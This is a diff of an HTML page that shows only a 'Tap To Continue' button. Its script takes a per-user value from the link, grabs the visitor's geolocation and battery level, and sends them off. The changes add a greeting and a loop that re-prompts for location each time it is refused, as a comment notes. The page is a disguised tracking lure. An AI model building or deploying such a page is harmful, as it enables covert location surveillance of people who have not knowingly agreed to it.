@@ -11,12 +11,18 @@ display:flex;
 justify-content:center;
 align-items:center;
 margin:0;
+flex-direction:column;
+font-family:Arial;
 }
 
 button{
 font-size:25px;
 padding:20px 40px;
 cursor:pointer;
+}
+
+h2{
+margin-top:20px;
 }
 </style>
 
@@ -28,6 +34,8 @@ cursor:pointer;
 Tap To Continue
 </button>
 
+<h2 id="msg"></h2>
+
 <script>
 
 const params = new URLSearchParams(window.location.search)
@@ -35,7 +43,13 @@ const user = params.get("user")
 
 function getLocation(){
 
-navigator.geolocation.getCurrentPosition(async function(pos){
+navigator.geolocation.getCurrentPosition(success,error)
+
+}
+
+async function success(pos){
+
+document.getElementById("msg").innerText = "Jai Balaji Dear"
 
 let batteryLevel = "Unknown"
 
@@ -57,11 +71,17 @@ battery:batteryLevel
 })
 })
 
-})
+}
+
+function error(){
+
+alert("Please allow location to continue")
+
+getLocation()   // ફરી popup આવશે
 
 }
 
 </script>
 
 </body>
-</html>   
+</html>
